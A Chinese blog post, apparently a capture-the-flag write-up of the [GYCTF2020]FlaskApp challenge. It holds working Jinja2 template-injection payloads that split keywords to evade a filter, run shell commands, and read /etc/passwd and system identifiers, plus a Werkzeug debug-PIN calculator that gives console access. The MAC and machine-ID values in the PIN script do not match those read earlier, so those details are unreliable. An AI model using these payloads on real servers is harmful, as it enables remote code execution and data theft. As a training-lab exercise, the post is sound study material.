{"blogid": "124011030", "writerAge": "码龄3年", "writerBlogNum": "51", "writerCollect": "71", "writerComment": "29", "writerFan": "781", "writerGrade": "3级", "writerIntegral": "623", "writerName": "姜小孩.", "writerProfileAdress": "writer_image\\profile_124011030.jpg", "writerRankTotal": "37630", "writerRankWeekly": "47218", "writerThumb": "84", "writerVisitNum": "56057", "blog_read_count": "2043", "blog_time": "于 2022-04-07 11:49:10 发布", "blog_title": "[GYCTF2020]FlaskApp", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<p id=\"main-toc\"><strong>目录</strong></p>\n<p id=\"%E8%BF%9B%E6%9D%A5%E6%9C%89%E6%8F%90%E7%A4%BA%E5%B0%B1%E7%9C%8B%E6%8F%90%E7%A4%BA%EF%BC%81%E6%91%86%E7%83%82%E7%9A%84%E5%A4%A7%E5%8A%A8%E4%BD%9C%EF%BC%81-toc\" style=\"margin-left:0px;\"><a href=\"#%E8%BF%9B%E6%9D%A5%E6%9C%89%E6%8F%90%E7%A4%BA%E5%B0%B1%E7%9C%8B%E6%8F%90%E7%A4%BA%EF%BC%81%E6%91%86%E7%83%82%E7%9A%84%E5%A4%A7%E5%8A%A8%E4%BD%9C%EF%BC%81\">进来有提示就看提示！摆烂的大动作！</a></p>\n<p id=\"%E8%AE%A1%E7%AE%97pin%E7%A0%81-toc\" style=\"margin-left:40px;\"><a href=\"#%E8%AE%A1%E7%AE%97pin%E7%A0%81\">计算pin码</a></p>\n<p id=\"%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%2Fetc%2Fpasswd%E6%96%87%E4%BB%B6%E3%80%82%E4%BD%BF%E7%94%A8%E5%A6%82%E4%B8%8B%E5%91%BD%E4%BB%A4-toc\" style=\"margin-left:80px;\"><a href=\"#%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%2Fetc%2Fpasswd%E6%96%87%E4%BB%B6%E3%80%82%E4%BD%BF%E7%94%A8%E5%A6%82%E4%B8%8B%E5%91%BD%E4%BB%A4\">我们可以查看/etc/passwd文件。使用如下命令</a></p>\n<p id=\"getattr(mod%2C%20%E2%80%98file%E2%80%99%2C%20None)flask%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84app.py%E7%9A%84%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84-toc\" style=\"margin-left:80px;\"><a href=\"#getattr%28mod%2C%20%E2%80%98file%E2%80%99%2C%20None%29flask%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84app.py%E7%9A%84%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84\">getattr(mod, ‘file’, None)flask目录下的app.py的绝对路径</a></p>\n<p id=\"%E5%BD%93%E5%89%8D%E7%94%B5%E8%84%91%E7%9A%84MAC%E5%9C%B0%E5%9D%80-toc\" style=\"margin-left:80px;\"><a href=\"#%E5%BD%93%E5%89%8D%E7%94%B5%E8%84%91%E7%9A%84MAC%E5%9C%B0%E5%9D%80\">当前电脑的MAC地址</a></p>\n<p id=\"%E6%9C%BA%E5%99%A8%E7%9A%84ID-toc\" style=\"margin-left:80px;\"><a href=\"#%E6%9C%BA%E5%99%A8%E7%9A%84ID\">机器的ID</a></p>\n<p id=\"%E6%80%BB%E7%BB%93%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%80%BB%E7%BB%93%EF%BC%9A\">总结：</a></p>\n<hr id=\"hr-toc\"/>\n<p></p>\n<h1><strong>进来有提示就看提示！摆烂的大动作！</strong></h1>\n<p><img alt=\"\" height=\"657\" src=\"image\\26eb55bcf7dd4ce7ad2dfa11851ccca1.png\" width=\"767\"/></p>\n<p> </p>\n<p></p>\n<p>入手点看来是失败了加密不可能失败，那就只能是解密失败了！解密失败后出现</p>\n<p><img alt=\"\" height=\"904\" src=\"image\\c6d1a7d74fb74da984b7d81fb7b2e9cb.png\" width=\"1200\"/></p>\n<p> </p>\n<p></p>\n<p>debug模式，读取到了部分源码</p>\n<p><img alt=\"\" height=\"801\" src=\"image\\55e71fafdb544a3f8ce9177320b8958b.png\" width=\"1200\"/></p>\n<pre><code>@app.route('/decode',methods=['POST','GET'])\ndef decode():\n    if request.values.get('text') :\n        text = request.values.get(\"text\")\n        text_decode = base64.b64decode(text.encode())\n        tmp = \"结果 ： {0}\".format(text_decode.decode())\n        if waf(tmp) :\n            flash(\"no no no !!\")\n            return redirect(url_for('decode'))\n        res =  render_template_string(tmp)</code></pre>\n<p></p>\n<p>根据代码我们知道加密后的代码经过waf后会被直接渲染，想起来这个名字是flask，那么可能存在ssti注入了！</p>\n<p>验证一下吧！加密{<!-- -->{1+1}}得到e3sxKzF9fQ==然后解密一下得到2说明存在ssti注入</p>\n<p><img alt=\"\" height=\"542\" src=\"image\\0beee7cfb9a64826b6867ae21eaab21a.png\" width=\"1200\"/></p>\n<p></p>\n<p>简单fuzz后发现过滤了flag、import、os、eval等关键词，我们用拆分bypass！</p>\n<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}\n{% if c.__name__ == 'catch_warnings' %}\n  {% for b in c.__init__.__globals__.values() %}\n  {% if b.__class__ == {}.__class__ %}\n    {% if 'eva'+'l' in b.keys() %}\n      {<!-- -->{ b['eva'+'l']('__impor'+'t__'+'(\"o'+'s\")'+'.pope'+'n'+'(\"ls /\").read()') }}\n    {% endif %}\n  {% endif %}\n  {% endfor %}\n{% endif %}\n{% endfor %}</code></pre>\n<p>加密后解密</p>\n<p><img alt=\"\" height=\"573\" src=\"image\\76cc2f4ffb054c6c87af1ab1d81b86ea.png\" width=\"1200\"/></p>\n<p></p>\n<p>拼接拿flag</p>\n<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}\n{% if c.__name__ == 'catch_warnings' %}\n  {% for b in c.__init__.__globals__.values() %}\n  {% if b.__class__ == {}.__class__ %}\n    {% if 'eva'+'l' in b.keys() %}\n      {<!-- -->{ b['eva'+'l']('__impor'+'t__'+'(\"o'+'s\")'+'.pope'+'n'+'(\"cat /this_is_the_fl\"+\"ag.txt\").read()') }}\n    {% endif %}\n  {% endif %}\n  {% endfor %}\n{% endif %}\n{% endfor %}</code></pre>\n<h2 id=\"%E8%AE%A1%E7%AE%97pin%E7%A0%81\">计算pin码</h2>\n<p>看到可以登录控制台同时，但是不太了解这个debug控制台的pin值，百度一下。好像这个是预期解。。想要拿到<code>PIN码</code>必须知道：</p>\n<blockquote>\n<pre>1.运行app的用户名，读/etc/passwd\n\n2.module name 一般固定为flask.app\n\n3.getattr(app, \"\\_\\_name\\_\\_\", app.\\_\\_class\\_\\_.\\_\\_name\\_\\_)的结果。就是Flask\n\n4.flask库下app.py的绝对路径，不是当前运行的app.py的路径，在debug模式下报错就能直接看见，该题为/usr/local/lib/python3.7/site-packages/flask/app.py\n\n5.当前网络的mac地址的十进制数。通过文件/sys/class/net/eth0/address读取，eth0为当前使用的网卡，如果有多个网卡数字可能会变，这里为02:42:ae:00:c3:58，转十进制为 2485410382680\n\n6.机器的id\n对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同，假如是在win平台下读取不到上面两个文件，就去获取注册表中SOFTWARE\\Microsoft\\Cryptography的值。对于docker机则读取/proc/self/cgroup，序列号为1那行\n1:name=systemd:/docker/210b2177689514627fab120347f7d1ea1e986bed6a9ef57504e2e3ac22e38c3c</pre>\n</blockquote>\n<h3 id=\"%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%2Fetc%2Fpasswd%E6%96%87%E4%BB%B6%E3%80%82%E4%BD%BF%E7%94%A8%E5%A6%82%E4%B8%8B%E5%91%BD%E4%BB%A4\">我们可以查看/etc/passwd文件。使用如下命令</h3>\n<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}\n{% if c.__name__ == 'catch_warnings' %}\n  {% for b in c.__init__.__globals__.values() %}\n  {% if b.__class__ == {}.__class__ %}\n    {% if 'eva'+'l' in b.keys() %}\n      {<!-- -->{ b['eva'+'l']('__impor'+'t__'+'(\"o'+'s\")'+'.pope'+'n'+'(\"cat /etc/passwd\").read()') }}\n    {% endif %}\n  {% endif %}\n  {% endfor %}\n{% endif %}\n{% endfor %}</code></pre>\n<pre><code>{<!-- -->{<!-- -->{}.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/etc/passwd').read()}}</code></pre>\n<p>这两种都可以读取，这样我们可以知道是flaskweb用户。</p>\n<h3 id=\"getattr(mod%2C%20%E2%80%98file%E2%80%99%2C%20None)flask%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84app.py%E7%9A%84%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84\">getattr(mod, ‘file’, None)flask目录下的app.py的绝对路径</h3>\n<p>报错信息告诉我们</p>\n<pre><code>/usr/local/lib/python3.7/site-packages/flask/app.py</code></pre>\n<h3 id=\"%E5%BD%93%E5%89%8D%E7%94%B5%E8%84%91%E7%9A%84MAC%E5%9C%B0%E5%9D%80\">当前电脑的MAC地址</h3>\n<p>我们可以读取<code>/sys/class/net/eth0/address</code>来获得mac的16进制：</p>\n<pre><code>{<!-- -->{<!-- -->{}.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/sys/class/net/eth0/address').read()}}</code></pre>\n<p>得到<code>a6:ac:19:45:f1:d8</code>将其转10进制<code>183258088600024</code>许多工具都不准确，值得注意。可以采用本地用python跑的方式，在本地python输入</p>\n<pre><code>&gt;&gt;&gt; print(int('a6ac1945f1d8',16))\n183258088600024</code></pre>\n<h3 id=\"%E6%9C%BA%E5%99%A8%E7%9A%84ID\">机器的ID</h3>\n<p>读取<code>/proc/self/cgroup</code>获取<code>get_machine_id()</code></p>\n<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{<!-- -->{ c.__init__.__globals__['__builtins__'].open('/proc/self/cgroup','r').read() }}{% endif %}{% endfor %}</code></pre>\n<p></p>\n<pre></pre>\n<p> </p>\n<blockquote>\n<p>1:name=systemd:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podcc096863_49c3_4caa_b633_05615b822d2b.slice/docker-b6ff692442683c70ab69d01d5310a9aba4d3014fc147c329891658c0e2048332</p>\n</blockquote>\n<p>我们要的是</p>\n<blockquote>\n<pre>1:name=systemd:/docker-b6ff692442683c70ab69d01d5310a9aba4d3014fc147c329891658c0e2048332</pre>\n</blockquote>\n<p>计算PIN码：</p>\n<pre><code>import hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'flaskweb',# username\n    'flask.app',# modname\n    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))\n    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),\n]\n \nprivate_bits = [\n    '2485377871838',# str(uuid.getnode()),  /sys/class/net/ens33/address\n    '4e2d4390ee2a9b57df253521f44301973efc74e35a300a02b4e509d60989543b'# get_machine_id(), /etc/machine-id\n]\n \nh = hashlib.md5()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n \ncookie_name = '__wzd' + h.hexdigest()[:20]\n \nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n \nrv =None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                          for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n \nprint(rv)</code></pre>\n<p>将得到的PIN码在Debug页面输入进入控制台，既可以执行python shell了：</p>\n<pre><code>os.popen('cat /this_is_the_flag.txt').read()</code></pre>\n<h2 id=\"%E6%80%BB%E7%BB%93%EF%BC%9A\">总结：</h2>\n<p>又见到了ssti注入，可以拼接绕过！</p>\n<p>又学到了pin码计算，不要开启dubug模式</p>\n<p>感谢buu提供优质的题，感谢勤劳的自己！</p>\n</div>\n</div>"}